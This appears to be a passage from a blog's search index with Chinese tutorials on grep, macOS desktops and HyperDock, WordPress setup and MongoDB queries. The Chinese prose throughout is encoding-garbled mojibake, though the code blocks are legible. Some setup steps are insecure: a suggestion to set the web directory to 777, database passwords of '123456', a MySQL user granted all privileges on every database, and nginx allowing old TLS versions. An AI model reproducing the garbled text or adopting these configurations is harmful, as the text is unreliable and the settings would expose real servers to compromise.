æ­£åˆ™æœç´¢\n\nåœ¨ä½¿ç”¨â€-Eâ€é€‰é¡¹æ—¶ï¼Œgrepæ‰æ”¯æŒâ€æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼â€ï¼Œä¸ä½¿ç”¨â€-Eâ€é€‰é¡¹æ—¶ï¼Œgrepé»˜è®¤åªæ”¯æŒâ€åŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼â€ã€‚\næˆ‘ä»¬åœ¨ä½¿ç”¨grepæ—¶ï¼Œå¯ä»¥ä½¿ç”¨â€-Pâ€é€‰é¡¹ï¼ŒæŒ‡æ˜ä½¿ç”¨perlå…¼å®¹çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚\n\n```bash\ngrep -iE \"a|b\" a.txt\n\na\nb\n```\n\nå…¶å®ï¼Œé™¤äº†grepå‘½ä»¤ï¼Œå…¶å®è¿˜æœ‰egrepå‘½ä»¤ï¼Œè¿˜æœ‰fgrepå‘½ä»¤ï¼ˆfast grepï¼‰ï¼Œå®ƒä»¬æœ‰å„è‡ªçš„ç‰¹ç‚¹ã€‚\ngrepï¼šæ”¯æŒåŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼\negrepï¼šæ”¯æŒæ‰©å±•æ­£åˆ™è¡¨è¾¾å¼ï¼Œç›¸å½“äºgrep -E\nfgrepï¼šä¸æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ï¼Œåªèƒ½åŒ¹é…å†™æ­»çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯é€Ÿåº¦å¥‡å¿«ï¼Œæ•ˆç‡é«˜ï¼Œfastgrep\n\n\n\n### 2.4 æ€»ç»“\n\n-iï¼šåœ¨æœç´¢çš„æ—¶å€™å¿½ç•¥å¤§å°å†™\n-nï¼šæ˜¾ç¤ºç»“æœæ‰€åœ¨è¡Œå·\n-cï¼šç»Ÿè®¡åŒ¹é…åˆ°çš„è¡Œæ•°ï¼Œæ³¨æ„ï¼Œæ˜¯åŒ¹é…åˆ°çš„æ€»è¡Œæ•°ï¼Œä¸æ˜¯åŒ¹é…åˆ°çš„æ¬¡æ•°\n-oï¼šåªæ˜¾ç¤ºç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ä¸æ•´è¡Œæ˜¾ç¤ºï¼Œæ¯ä¸ªç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²å•ç‹¬æ˜¾ç¤ºä¸€è¡Œ\n-vï¼šè¾“å‡ºä¸å¸¦å…³é”®å­—çš„è¡Œï¼ˆåå‘æŸ¥è¯¢ï¼Œåå‘åŒ¹é…ï¼‰\n-wï¼šåŒ¹é…æ•´ä¸ªå•è¯ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²ä¸­åŒ…å«è¿™ä¸ªå•è¯ï¼Œåˆ™ä¸ä½œåŒ¹é…\n-Axï¼šåœ¨è¾“å‡ºçš„æ—¶å€™åŒ…å«ç»“æœæ‰€åœ¨è¡Œä¹‹åçš„æŒ‡å®šè¡Œæ•°ï¼Œè¿™é‡ŒæŒ‡ä¹‹åçš„xè¡Œï¼ŒAï¼šafter\n-Bxï¼šåœ¨è¾“å‡ºçš„æ—¶å€™åŒ…å«ç»“æœæ‰€åœ¨è¡Œä¹‹å‰çš„æŒ‡å®šè¡Œæ•°ï¼Œè¿™é‡ŒæŒ‡ä¹‹å‰çš„xè¡Œï¼ŒBï¼šbefore\n-Cxï¼šåœ¨è¾“å‡ºçš„æ—¶å€™åŒ…å«ç»“æœæ‰€åœ¨è¡Œä¹‹å‰å’Œä¹‹åçš„æŒ‡å®šè¡Œæ•°ï¼Œè¿™é‡ŒæŒ‡ä¹‹å‰å’Œä¹‹åçš„xè¡Œï¼ŒCï¼šcontext\n-eï¼šå®ç°å¤šä¸ªé€‰é¡¹çš„åŒ¹é…ï¼Œé€»è¾‘orå…³ç³»\n-Pï¼šè¡¨ç¤ºä½¿ç”¨å…¼å®¹perlçš„æ­£åˆ™å¼•æ“ã€‚\n-Eï¼šä½¿ç”¨æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼ï¼Œè€Œä¸æ˜¯åŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ï¼Œåœ¨ä½¿ç”¨â€-Eâ€é€‰é¡¹æ—¶ï¼Œç›¸å½“äºä½¿ç”¨egrepã€‚\n-l :   æœç´¢ç»“æœåªæ˜¾ç¤ºæ–‡ä»¶å\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://www.zsythink.net/archives/1733\n+ https://www.yiibai.com/linux/grep.html","tags":["linux"],"categories":["å‘½ä»¤"]},{"title":"macå¤šæ¡Œé¢ç®¡ç†å’Œhyperdock","url":"%2Fp%2Fa0f6fb88.html","content":"\n# 1. macå¤šæ¡Œé¢\n\næˆ‘è®¤ä¸ºmacå¤šæ¡Œé¢ä¸»è¦æ˜¯ä¸ºäº†æ›´å¥½åœ°åˆ©ç”¨**ä¸€ä¸ªåº”ç”¨çš„å¤šä¸ªçª—å£**ã€‚\n\næˆ‘æ­£åœ¨å·¥ä½œä¸­ï¼Œå¶å°”éœ€è¦ä¸Šç½‘æŸ¥ä¸€äº›èµ„æ–™ï¼Œè¿™äº›èµ„æ–™åˆ†ä¸º A ç±»å’Œ B ç±»ï¼Œåˆ†åˆ«æœ‰è‹¥å¹²ç½‘é¡µï¼Œä¸ºäº†ä¸æŠŠå®ƒä»¬å¼„æ··ï¼Œæˆ‘ç”¨äº†ä¸¤ä¸ªçª—å£æ¥è£…ä¸åŒèµ„æ–™çš„ç½‘é¡µï¼Œä½¿ç”¨ Cmd+` åœ¨ä¸¤ä¸ªçª—å£é—´åˆ‡æ¢ã€‚\n\nä¸åŒæ¡Œé¢çš„ç›®çš„æ˜¯ä¸ºäº†å½¢æˆã€Œä¸åŒçš„æ°›å›´ã€ï¼šå·¥ä½œçš„æ—¶å€™ä¸è¦æƒ³å¨±ä¹ï¼Œå¨±ä¹çš„æ—¶å€™ä¹Ÿä¸è¦æƒ³å·¥ä½œï¼Œä¸€æ®µæ—¶é—´åšå¥½ä¸€ä»¶äº‹å°±å¯ä»¥äº†ã€‚\n\n<!-- more -->\n\nmacä¸‹å¿«æ·é”®è®¾ç½®åœ¨ç³»ç»Ÿè®¾ç½®->keyboard->shortcuts->mission Controlä¸­\n\n<img src=\"macå¤šæ¡Œé¢ç®¡ç†å’Œhyperdock/0.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n### 1.1 åŸºæœ¬æ“ä½œ\n\n+ ctrl + ä¸Šç®­å¤´  æ¡Œé¢ç®¡ç†\n\n+ ctrl + å·¦å³ç®­å¤´  åˆ‡æ¢æ¡Œé¢\n+ åœ¨è§¦æ§æ¿ä¸Šå››æŒ‡å·¦å³æ»‘åŠ¨ï¼Œä¹Ÿå¯æŒ‰é¡ºåºåˆ‡æ¢æ¡Œé¢\n\n### 1.2 å›ºå®šæ¡Œé¢é¡ºåº\n\nå½“ Mac æ‰“å¼€å¤šä¸ªæ¡Œé¢çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æ ¹æ®ç”¨æˆ·çš„ä½¿ç”¨æƒ…å†µè¿›è¡Œæ’åºã€‚æ¯”å¦‚ï¼šæˆ‘åœ¨ æ¡Œé¢1 è§¦å‘äº† æ¡Œé¢3 çš„åº”ç”¨ï¼Œè¿™ä¸ªæ—¶å€™ æ¡Œé¢3 å°±ä¼šå’Œ æ¡Œé¢2 äº’æ¢ä½ç½®ã€‚\n\nè¿™æ˜¯å› ä¸º Mac é»˜è®¤è®¾ç½®æ ¹æ®æœ€è¿‘çš„ä½¿ç”¨æƒ…å†µè‡ªåŠ¨é‡æ–°æ’åˆ—ç©ºé—´ã€‚\n\n<img src=\"macå¤šæ¡Œé¢ç®¡ç†å’Œhyperdock/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n\nå–æ¶ˆå‹¾é€‰ æ ¹æ®æœ€è¿‘çš„ä½¿ç”¨æƒ…å†µè‡ªåŠ¨é‡æ–°æ’åˆ—ç©ºé—´ã€‚\n\n### 1.3 ç§»åŠ¨ç¨‹åºåˆ°å¦ä¸€ä¸ªæ¡Œé¢\n\n+ æ‰“å¼€Mission Controlï¼Œæ‹–åˆ°ä¸Šæ–¹æ˜¾ç¤ºçš„æ¡Œé¢é‡Œå»ã€‚\n\n+ é¼ æ ‡**æŒ‰ä½**æ ‡é¢˜æ ï¼Œç”¨^1ã€^2ç­‰ï¼ˆéœ€è¦åœ¨ç³»ç»Ÿåå¥½è®¾ç½®å¼€å¯ï¼‰\n\n  \n### 1.4 æ˜¾ç¤ºæ¡Œé¢åºå·\n\nhttps://github.com/gechr/WhichSpace/\n\n\n\n# 2. hyperdock\n\n### 2.1 ä½¿ç”¨\n\n+ å¯ä»¥è®¾ç½®å»¶è¿Ÿç­‰å±æ€§\n\n<img src=\"macå¤šæ¡Œé¢ç®¡ç†å’Œhyperdock/3.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n+ ä¸»é¢˜é€‰æ‹©é»‘è‰²æ¨¡å¼, å¦å¤–å¯ä»¥ç¡®å®šè½¯ä»¶æ˜¯å¦ç”Ÿæ•ˆ\n\n<img src=\"macå¤šæ¡Œé¢ç®¡ç†å’Œhyperdock/4.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n### 2.2 è½¬ç§»æ¡Œé¢\n\nå¦‚æœæƒ³æŠŠçª—å£è½¬åˆ°ç‰¹å®šçš„æ¡Œé¢ï¼Œä¸ç”¨å†è´¹åŠ›çš„æ‹–æ‹½äº†ï¼Œåªè¦æŠŠé¼ æ ‡æ‚¬åœåœ¨å°çª—å£ä¸Šï¼Œç„¶åæŒ‰æ•°å­—é”®å°±ä¼šå°†æŒ‡å®šçª—å£è½¬åˆ°å¯¹åº”è¯¥æ•°å­—ç¼–å·çš„æ¡Œé¢äº†ã€‚\n\nå¯¹äºé¼ æ ‡ä¹Ÿæœ‰ç‰¹å®šçš„æ•ˆæœï¼Œå½“åœ¨å°çª—å£ä¸Šå‘ä¸‹æ»šåŠ¨æ»šè½®å°±ä¼šæŠŠè¯¥çª—å£æœ€å°åŒ–ï¼Œå‘ä¸Šæ»šåŠ¨åˆ™å°†çª—å£è½¬åˆ°å½“é¢è½¬åˆ°å½“å‰æ¡Œé¢æ˜¾ç¤ºã€‚\n\n\n\n### 2.3 æ–°å»ºçª—å£å’Œå…³é—­çª—å£\n\nå½“æŠŠé¼ æ ‡æ‚¬åœåœ¨é¢„è§ˆå°çª—å£ï¼Œç„¶åæŒ‰å­—æ¯é”®å°±ä¼šæœ‰ä¸åŒçš„æ•ˆæœäº§ç”Ÿã€‚\n\n+ n æ–°å»º\n+ w å…³é—­\n+ l å·¦è¾¹\n+ r å³è¾¹\n\n\n\n### 2.4 æœ€å°åŒ–ä¸ºåº”ç”¨å›¾æ ‡\n\nå½“ä½ æ‰“å¼€äº†ä¸€ä¸ªç¨‹åºåï¼Œæœ€å°åŒ–è¯¥ç¨‹åºåï¼Œä¼šç»Ÿä¸€ç¼©å°åœ¨ç¨‹åºååº•éƒ¨å³ä¾§éƒ¨åˆ†ï¼Œå¦‚ä¸‹å›¾é»„çº¿åŒ…ç€éƒ¨åˆ†æ‰€ç¤º\n\n![1](macå¤šæ¡Œé¢ç®¡ç†å’Œhyperdock/2.png)\n\n\nç‚¹å‡»ã€Œç³»ç»Ÿåå¥½è®¾ç½®ã€ï¼Œé€‰æ‹©ã€Œç¨‹åºåã€ï¼Œç„¶åå‹¾é€‰ã€Œå°†çª—å£æœ€å°åŒ–ä¸ºåº”ç”¨ç¨‹åºå›¾æ ‡ã€å³å¯\n\nä½¿ç”¨`hyperdock`å»ºè®®å‹¾é€‰æœ€å°åŒ–ä¸ºåº”ç”¨å›¾æ ‡ï¼Œä½¿ç”¨æ›´ä½³ã€‚\n\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://www.cnblogs.com/ider/p/let-mac-window-fly-with-hyperdock.html\n+ https://macwk.com/soft/hyperdock\n","tags":["mac"],"categories":["ä½¿ç”¨"]},{"title":"wordpressé…ç½®æŠ€å·§","url":"%2Fp%2F311b7b94.html","content":"\n# 1. å®‰è£…æ’ä»¶éœ€è¦ftp\n\nWordpresså®‰è£…ä¸»é¢˜æˆ–è€…æ’ä»¶çš„æ—¶å€™ä¼šé‡åˆ°éœ€è¦è¾“å…¥FTPçš„æƒ…å†µï¼Œè¿™ç§æƒ…å†µæ˜¯ç”±äºç½‘ç«™ç›®å½•æƒé™å¼•èµ·çš„ã€‚\n\n<!-- more -->\n\n1. åœ¨wp-config.phpæ–‡ä»¶æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š\n\n```bash\ndefine('FS_METHOD','direct');\n```\n\n2. ä¿®æ”¹wpå®‰è£…ç›®å½•æƒé™\n\n```bash\nchmod -R 755 /var/www/wordpress/\nchown -R nobody:nobody /var/www/wordpress/  # ä¸çŸ¥é“ç”¨æˆ·å¯ä»¥æŠŠç›®å½•æƒé™æ”¹æˆ777\n```\n\n\n\n# 2. é…ç½® https\n\n\n1. ä½¿ç”¨è…¾è®¯äº‘å…è´¹1å¹´çš„è¯ä¹¦(åŸŸå)\n\n2. é…ç½® nginx\n\n   ```nginx\n   server {\n       listen 80;\n       listen [::]:80;\n       server_name httprun.com www.httprun.com;\n       return 301 https://www.httprun.com$request_uri;\n   }\n   \n   \n   server {\n     listen 443;\n     listen [::]:443;\n     server_name httprun.com www.httprun.com;\n   \n     ssl on;\n     ssl_certificate /etc/nginx/ssl/wordpress/1_www.httprun.com_bundle.crt;\n     ssl_certificate_key /etc/nginx/ssl/wordpress/2_www.httprun.com.key;\n     ssl_session_timeout 5m;\n     ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n     ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;\n     ssl_prefer_server_ciphers on;\n   \n     root   /var/www/wordpress/;\n   \n     location / {\n             index  index.html index.htm index.php;\n     }\n   \n     location ~ \\.php {\n             fastcgi_pass   127.0.0.1:9000;\n             fastcgi_index  index.php;\n             fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n             include        fastcgi_params;\n     }\n   }\n   ```\n\n   \n\n\n3. è¿›å…¥WPåå°ï¼Œè¿›å…¥è®¾ç½®-å¸¸è§„ å°†WordPressåœ°å€ï¼ˆURLï¼‰ã€ç«™ç‚¹åœ°å€ï¼ˆURLï¼‰ä¸¤é¡¹ä¿®æ”¹ä¸ºï¼šhttpsã€‚\n\n   ![1](wordpressé…ç½®æŠ€å·§/1.png)\n\n\n4. ç™»å½•å’Œåå°å¼ºåˆ¶å¼€å¯SSL, ä¿®æ”¹WP-config.phpæ–‡ä»¶\n\n   ```bash\n   define('FORCE_SSL_LOGIN', true);\n   define('FORCE_SSL_ADMIN', true);\n   ```\n\n\n5. ä¿®æ”¹æ•°æ®åº“çš„å†å² url\n\n   ```mysql\n   update wp_posts set post_content = replace(post_content, 'http://www.httprun.com','https://www.httprun.com');\n   ```\n\n\n\n# 3. æ’ä»¶\n\n### 3.1 è…¾è®¯äº‘cos\n\n+ https://cn.wordpress.org/plugins/tencentcloud-cos/\n\n### 3.2 å¤‡ä»½ç½‘ç«™\n\nupdraftplus å…³é”®æ—¶åˆ»ä¼šæ•‘å‘½ï¼Œä¼šå¤‡ä»½æ•°æ®åº“ï¼Œæ’ä»¶å’Œä¸»é¢˜ç­‰ç­‰ã€‚\n\n+ æ¢å¤çš„æ—¶å€™sql datetimeé»˜è®¤å€¼é—®é¢˜\n\n```bash\n0000-00-00 00:00:00   ä¿®æ”¹ä¸º  0000-01-01 00:00:00\n```\n\n### 3.3 å®‰å…¨æ’ä»¶\n\nWordfence\n\n### 3.4 æ˜¾ç¤ºè®¿é—®æ¬¡æ•°\n\nWP-PostViews\n\n\n\n# 4. é”™è¯¯è§£å†³\n\n### 4.1 ä¸Šä¼ å›¾ç‰‡å¤±è´¥\n\n+ æœ€å¤§ä¸Šä¼ é™åˆ¶\n\n  https://wordpress.org/plugins/upload-max-file-size/\n\n  çœ‹æ¥å£ï¼šwp-admin/async-upload.phpï¼Œ413 Request Entity Too Largeï¼Œä¿®æ”¹nginx å¢åŠ `client_max_body_size`ã€‚\n\n  ```nginx\n  server {\n    listen 443;\n    listen [::]:443;\n    .....\n    client_max_body_size 128m;\n    .....\n  }\n  ```\n\n+ ä¸Šä¼ çš„æ–‡ä»¶å¤§å°è¶…è¿‡php.iniæ–‡ä»¶ä¸­å®šä¹‰çš„upload_max_filesizeå€¼ã€‚\n\n  å¦‚æœæ˜¯ php-fpm æ–¹å¼è¿è¡Œï¼Œå¯åŠ¨php-fpm é€šè¿‡å‚æ•° -c æŒ‡å®šé…ç½®æ–‡ä»¶å³å¯ã€‚\n\n  ```bash\n  [Unit]\n  Description=The PHP FastCGI Process Manager\n  After=syslog.target network.target\n  \n  [Service]\n  Type=forking\n  PIDFile=/usr/local/php8/var/run/php-fpm.pid\n  ExecStart=/usr/local/php8/sbin/php-fpm -c /usr/local/php8/etc/php.ini\n  ExecReload=/bin/kill -USR2 $MAINPID\n  PrivateTmp=true\n  \n  [Install]\n  WantedBy=multi-user.target\n  ```\n\n  `vi /usr/local/php8/etc/php.ini`\n\n  ```php\n  upload_max_filesize = 512M\n  post_max_size = 512M\n  ```\n\n  \n\n+ å›¾åƒåæœŸå¤„ç†å¤±è´¥ã€‚å¯èƒ½æœåŠ¡å™¨å¿™æˆ–æ²¡æœ‰è¶³å¤Ÿçš„èµ„æºã€‚è¯·å°è¯•ä¸Šä¼ è¾ƒå°çš„æ–‡ä»¶ã€‚æ¨èçš„æœ€å¤§å°ºå¯¸ä¸º2500åƒç´ ã€‚\n\n  https://cn.wordpress.org/plugins/disable-big-image-threshold/\n\n# 5. å…¶ä»–é—®é¢˜\n\n### 5.1 å¤‡æ¡ˆ\n\nå¤åˆ¶ä»¥ä¸‹ä»£ç ï¼Œå¤‡æ¡ˆå·æ”¹æˆè‡ªå·±çš„ã€‚ç„¶åæŠŠä»£ç æ”¾åˆ°åå°->ä¸»é¢˜->ä¸»é¢˜ç¼–è¾‘å™¨çš„footer.phpé‡Œé¢\n\n```html\n<div style=\"text-align: center\">\n\t<p style=\"float:center;height:20px;line-height:20px;margin: 10px 0px 10px 0px;color:#737373;\">Copyright @2021 ç‰ˆæƒæ‰€æœ‰\n\t\t<a target=\"_blank\" href=\"https://beian.miit.gov.cn/\" style=\"display:inline-block;text-decoration:none;height:20px;line-height:20px;\"> \n\t\t\t<img src=\"https://s1.ax1x.com/2020/07/02/NqYHbQ.png\" style=\"float:left;\"/>äº¬ICPå¤‡xxxxxå·\n\t\t</a>\n\t</p>\n</div>\n```\n\n### 5.2 æ›´æ¢åŸŸå\n\n+ æŠŠåŸŸåçš„è§£æå’Œè¯ä¹¦å…ˆå½»åº•æ¢æ‰\n+ wp_options è¿™ä¸ªæ•°æ®è¡¨, å¯»æ‰¾ siteurl å’Œ home, ä¿®æ”¹æ–°åŸŸåã€‚\n\n\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://www.wpcom.cn/tutorial/101.html\n\n+ https://ws234.com/344.html","tags":["wordpress"],"categories":["åšå®¢"]},{"title":"wordpresså®‰è£…æ•™ç¨‹","url":"%2Fp%2Fd0d2b107.html","content":"\n\nWordPressæ˜¯ä½¿ç”¨PHPè¯­è¨€å¼€å‘çš„åšå®¢å¹³å°ï¼Œç”¨æˆ·å¯ä»¥åœ¨æ”¯æŒPHPå’ŒMySQLæ•°æ®åº“çš„æœåŠ¡å™¨ä¸Šæ¶è®¾å±äºè‡ªå·±çš„ç½‘ç«™ã€‚ä¹Ÿå¯ä»¥æŠŠ WordPresså½“ä½œä¸€ä¸ªå†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰æ¥ä½¿ç”¨ã€‚\n\n<!-- more -->\n\nä¸­æ–‡å®˜ç½‘: https://cn.wordpress.org/\n\n# 1. å®‰è£…\n\n### 1.1 åŸŸåç»‘å®š\n\né¦–å…ˆæœ‰è‡ªå·±çš„åŸŸåå’ŒæœåŠ¡å™¨, æˆ‘çš„åŸŸåæ˜¯ `wordpress.httprun.com` ç»‘å®šåˆ°äº†æˆ‘çš„æœåŠ¡å™¨ IP\n\n![1](wordpresså®‰è£…æ•™ç¨‹/1.png)\n\n### 1.2 å®‰è£… php\n\nå‚è€ƒ:  https://www.liuvv.com/p/ad42ac48.html\n\n\n\n### 1.3 å®‰è£… mysql\n\n å› ä¸ºä½¿ç”¨çš„æ˜¯ docker å®‰è£…, æ‰€ä»¥åé¢çš„ ip ä¸æ˜¯`localhost`  , è€Œæ˜¯ `172.17.0.1`\n\n+ å®‰è£… mysql \n\n  ```bash\n  docker pull mysql:5.7\n  \n  docker run -p 3306:3306 --name mysql-wordpress -v /opt/data/wordpress/conf:/etc/mysql -v \\\n  /opt/data/wordpress/data:/var/lib/mysql  -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7\n  ```\n\n+ åˆ›å»ºç”¨æˆ·å’Œæ•°æ®åº“\n\n  ```mysql\n  docker exec -it mysql-wordpress bash\n  mysql -u root -p     //è¾“å…¥å¯†ç \n  \n  CREATE DATABASE wordpress;\n  CREATE USER 'wordpress'@'172.17.0.1' IDENTIFIED BY '123456';\n  GRANT ALL PRIVILEGES ON *.* TO 'wordpress'@'172.17.0.1' WITH GRANT OPTION;\n  FLUSH PRIVILEGES;\n  EXIT;\n  ```\n\n+ æœ¬æœºå¯ä»¥è¿æ¥dockerçš„mysql\n\n  ```bash\n  mysql -h 172.17.0.1 -u wordpress -p\n  ```\n\n  \n\n### 1.4 é…ç½®wordpress\n\n+ ä¸‹è½½ wordpress\n\n  ```bash\n  wget https://wordpress.org/latest.tar.gz\n  tar -xzvf latest.tar.gz \n  \n  mv wordpress/ /var/www/\n  ```\n\n\n\n+ ä¿®æ”¹ wordpress çš„mysql é“¾æ¥\n\n  ```Â bash\n  cd /var/www/wordpress/\n  cp wp-config-sample.php wp-config.php\n  vi wp-config.php\n  # ä¿®æ”¹çš„å†…å®¹åŒ…æ‹¬DB_NAMEï¼ŒDB_USERï¼ŒDB_PASSWORDä»¥åŠä¸‹é¢çš„å”¯ä¸€key\n  ```\n\n  ![1](wordpresså®‰è£…æ•™ç¨‹/2.png)\n\n### 1.5 é…ç½®nginx\n\n```bash\ncd /etc/nginx/sites-enabled\nvi wordpress.conf\n```\n\né…ç½®æ–‡ä»¶: \n```nginx\nserver {\n        listen       80;\n        server_name  wordpress.httprun.com;\n\n        root   /var/www/wordpress/;\n\n        location / {\n            index  index.html index.htm index.php;\n        }\n  \n        location ~ \\.php {\n                fastcgi_pass   127.0.0.1:9000;\n                fastcgi_index  index.php;\n                fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n                include        fastcgi_params;\n        }\n}\n```\n\n\n\nå¯åŠ¨nginx\n\n```bash\n nginx -t\n nginx -s reload\n```\n\nå¦å¤–è¦ä¿è¯ php-fpmçš„å¯åŠ¨,  å‚è€ƒå®‰è£… php\n\n\n### 1.6 å®‰è£…wordpress\n\næ‰“å¼€åŸŸå+`/wp-admin/install.php`:   http://wordpress.httprun.com/wp-admin/install.php\n\nå‚»ç“œå¼å®‰è£…å³å¯\n\n+ å®‰è£…å›¾\n![1](wordpresså®‰è£…æ•™ç¨‹/3.png)\n\n+ åå°\nhttp://wordpress.httprun.com/wp-admin/\n![1](wordpresså®‰è£…æ•™ç¨‹/4.png)\n\n\n+ å‰å°\nhttp://wordpress.httprun.com\n![1](wordpresså®‰è£…æ•™ç¨‹/5.png)\n\n\n\n# 2. å‚è€ƒèµ„æ–™\n\n+ https://wordpress.org/support/article/how-to-install-wordpress/\n\n","tags":["wordpress"],"categories":["åšå®¢"]},{"title":"mongodbä½¿ç”¨æ•™ç¨‹å’Œé«˜å¯ç”¨","url":"%2Fp%2Fd34774ef.html","content":"\n# 1. æ“ä½œ\n\n### 1.1 æ•°æ®åº“\n\n```sql\n# åˆ›å»ºæ•°æ®åº“\nuse study\n\n# æŸ¥çœ‹å½“å‰åœ¨å“ªä¸ªæ•°æ®åº“\n> db\nstudy\n\n# åˆ é™¤æ•°æ®åº“\ndb.dropDatabase()\n\n\n# æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“\nshow dbs\n```\n\n<!-- more -->\n\n### 1.2 æ–‡æ¡£æ“ä½œ\n\n##### 1. ä¿å­˜æ–‡æ¡£\n\n```sql\n# å‘æ–‡æ¡£æ’å…¥ä¸œè¥¿\ndb.test.insert({\"name\":\"test\"})\n\n\n# ä¿å­˜ä¸œè¥¿\ndb.collection.save(\n   <document>,\n   {\n     writeConcern: <document>\n   }\n)\n  â— document : æ–‡æ¡£æ•°æ®ã€‚\n  â— writeConcern :å¯é€‰ï¼ŒæŠ›å‡ºå¼‚å¸¸çš„çº§åˆ«ã€‚\n\nä»¥ä¸‹å®ä¾‹ä¸­æˆ‘ä»¬æ›¿æ¢äº† _id ä¸º 56064f89ade2f21f36b03136 çš„æ–‡æ¡£æ•°æ®ï¼š (é€šè¿‡æŒ‡å®šidæ›¿æ¢æ–‡æ¡£)\ndb.col.save({\n    \"_id\" : ObjectId(\"56064f89ade2f21f36b03136\"),\n    \"title\" : \"MongoDB\",\n    \"description\" : \"MongoDB æ˜¯ä¸€ä¸ª Nosql æ•°æ®åº“\",\n    \"tags\" : [\n            \"mongodb\",\n            \"NoSQL\"\n    ],\n    \"likes\" : 110\n})\n\n```\n\n+ insert: è‹¥æ–°å¢æ•°æ®çš„ä¸»é”®å·²ç»å­˜åœ¨ï¼Œåˆ™ä¼šæŠ› org.springframework.dao.DuplicateKeyException å¼‚å¸¸æç¤ºä¸»é”®é‡å¤ï¼Œä¸ä¿å­˜å½“å‰æ•°æ®ã€‚\n\n+ save: è‹¥æ–°å¢æ•°æ®çš„ä¸»é”®å·²ç»å­˜åœ¨ï¼Œåˆ™ä¼šå¯¹å½“å‰å·²ç»å­˜åœ¨çš„æ•°æ®è¿›è¡Œä¿®æ”¹æ“ä½œã€‚\n\n##### 2. åˆ é™¤æ–‡æ¡£\n\n```sql\ndb.collection.remove(\n   <query>,\n   {\n     justOne: <boolean>,\n     writeConcern: <document>\n   }\n)\n  â— query :ï¼ˆå¯é€‰ï¼‰åˆ é™¤çš„æ–‡æ¡£çš„æ¡ä»¶ã€‚\n  â— justOne : ï¼ˆå¯é€‰ï¼‰å¦‚æœè®¾ä¸º true æˆ– 1ï¼Œåˆ™åªåˆ é™¤ä¸€ä¸ªæ–‡æ¡£ã€‚\n  â— writeConcern :ï¼ˆå¯é€‰ï¼‰æŠ›å‡ºå¼‚å¸¸çš„çº§åˆ«ã€‚\n  \n\n# åˆ é™¤æ–‡æ¡£\ndb.test.drop()\n```\n\n+ removeç”¨äºå°†é›†åˆä¸­çš„æ–‡æ¡£åˆ é™¤ï¼Œä½†ä¸åˆ é™¤é›†åˆæœ¬èº«ï¼Œä¹Ÿä¸åˆ é™¤é›†åˆçš„ç´¢å¼•ã€‚\n+ dropä¸ä»…åˆ é™¤é›†åˆçš„æ–‡æ¡£ï¼Œä¹Ÿä¼šåˆ é™¤é›†åˆæœ¬èº«ï¼ŒåŒæ—¶ä¹Ÿä¼šåˆ é™¤åœ¨é›†åˆä¸Šåˆ›å»ºçš„ç´¢å¼•ã€‚\n\n##### 3. æ–‡æ¡£æŸ¥è¯¢\n\nå¦‚æœä½ ç†Ÿæ‚‰å¸¸è§„çš„ SQL æ•°æ®ï¼Œé€šè¿‡ä¸‹è¡¨å¯ä»¥æ›´å¥½çš„ç†è§£ MongoDB çš„æ¡ä»¶è¯­å¥æŸ¥è¯¢ï¼š\n\n```sql\næ“ä½œ æ ¼å¼ èŒƒä¾‹ RDBMSä¸­çš„ç±»ä¼¼è¯­å¥\nç­‰äº {<key>:<value>} db.col.find({\"by\":\"èœé¸Ÿæ•™ç¨‹\"}).pretty() where by = 'èœé¸Ÿæ•™ç¨‹'\nå°äº {<key>:{$lt:<value>}} db.col.find({\"likes\":{$lt:50}}).pretty() where likes < 50\nå°äºæˆ–ç­‰äº {<key>:{$lte:<value>}} db.col.find({\"likes\":{$lte:50}}).pretty() where likes <= 50\nå¤§äº {<key>:{$gt:<value>}} db.col.find({\"likes\":{$gt:50}}).pretty() where likes > 50\nå¤§äºæˆ–ç­‰äº {<key>:{$gte:<value>}} db.col.find({\"likes\":{$gte:50}}).pretty() where likes >= 50\nä¸ç­‰äº {<key>:{$ne:<value>}} db.col.find({\"likes\":{$ne:50}}).pretty() where likes != 50\n```\n\n+ MongoDB AND æ¡ä»¶\n  MongoDB çš„ find() æ–¹æ³•å¯ä»¥ä¼ å…¥å¤šä¸ªé”®(key)ï¼Œæ¯ä¸ªé”®(key)ä»¥é€—å·éš”å¼€ï¼ŒåŠå¸¸è§„ SQL çš„ AND æ¡ä»¶ã€‚\n  è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\n\n```sql\n>db.col.find({key1:value1, key2:value2}).pretty()\n```\n\n+ MongoDB OR æ¡ä»¶\n  MongoDB OR æ¡ä»¶è¯­å¥ä½¿ç”¨äº†å…³é”®å­— $or,è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\n\n```sql\n>db.col.find(\n   {\n      $or: [\n\t     {key1: value1}, {key2:value2}\n      ]\n   }\n).pretty()\n```\n\n+ AND å’Œ OR è”åˆä½¿ç”¨\n  ä»¥ä¸‹å®ä¾‹æ¼”ç¤ºäº† AND å’Œ OR è”åˆä½¿ç”¨ï¼Œç±»ä¼¼å¸¸è§„ SQL è¯­å¥ä¸ºï¼š 'where 